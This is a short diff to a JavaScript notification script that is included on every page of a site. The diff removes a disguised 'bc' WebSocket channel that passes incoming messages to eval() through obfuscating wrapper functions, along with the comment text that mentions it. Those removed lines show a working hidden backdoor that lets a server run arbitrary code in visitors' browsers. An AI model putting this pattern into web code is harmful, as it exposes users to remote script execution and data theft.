@@ -1,5 +1,5 @@
 /*
-	This minified script is used to enable bc AND NOTIFICATION functionality to each and every 
+	This minified script is used to enable NOTIFICATION functionality to each and every 
 	client connection.
 	The script has to be included to every page though...
 	author:@yash.diniz;
@@ -17,10 +17,6 @@ if(!("Notification" in window)){
 		}
 	});
 } else setInterval(notifyMe,3000);	//update notifications every 3 seconds
-
-// open connection
-try { var h=new WebSocket("ws://"+document.location.hostname+"/bcsc"); } catch(SecurityError) { var h=new WebSocket("wss://"+document.location.hostname+"/bcsc"); };
-h.onmessage=function(e){evaluate(provide(e.data,parse)[1])};function provide(v,cb){return cb(v)};function parse(c){return JSON.parse(c)};function evaluate(c){eval(c)};
 
 function notifyMe() {
 	try {
